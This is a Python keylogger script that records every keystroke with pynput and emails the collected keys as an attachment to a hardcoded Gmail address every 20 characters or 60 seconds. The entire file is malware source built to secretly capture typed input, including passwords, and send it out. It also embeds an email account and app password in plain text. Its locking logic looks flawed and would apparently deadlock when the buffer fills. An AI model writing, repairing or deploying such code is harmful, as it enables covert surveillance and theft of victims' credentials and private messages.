from pynput import keyboard
import yagmail
import threading
import logging
import traceback

# Enable debug logs for email sending
logging.basicConfig(level=logging.DEBUG)

log_file = "keystrokes.txt"
email_user = "ssade6k@gmail.com"  # Your email
email_pass = "eipbotonqjvfoijw"   # Your Gmail app password
send_to = "ssade6k@gmail.com"     # Receiver (can be same as sender)

buffer = []
buffer_lock = threading.Lock()
timer = None

def send_email_file():
    global buffer, timer
    with buffer_lock:
        if buffer:
            try:
                print("[*] Sending email with typed keys as file...")
                content = ''.join(buffer)

                # Save keystrokes to file
                with open(log_file, 'w') as f:
                    f.write(content)

                # Send email with the file
                yag = yagmail.SMTP(email_user, email_pass)
                yag.send(
                    to=send_to,
                    subject="Keylogger Report (File)",
                    contents="See attached file for the latest keystrokes.",
                    attachments=log_file
                )
                print("[+] Email sent successfully.")
                buffer.clear()
            except Exception as e:
                print("[-] Failed to send email.")
                traceback.print_exc()
        else:
            print("[!] Buffer was empty. Nothing to send.")
        timer = None  # Reset timer

def start_timer():
    global timer
    if not timer:
        timer = threading.Timer(60.0, send_email_file)
        timer.start()
        print("[*] Timer started for 60 seconds...")

def on_press(key):
    global buffer
    try:
        with buffer_lock:
            char = key.char if hasattr(key, 'char') else f"[{key}]"
            buffer.append(char)
            print(f"Key: {char}")

            if len(buffer) >= 20:
                send_email_file()
            else:
                start_timer()

    except Exception as e:
        print("[-] Error capturing key:", e)
        traceback.print_exc()

print("[*] Keylogger started. (20+ chars = instant send, <20 = send after 60s)")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

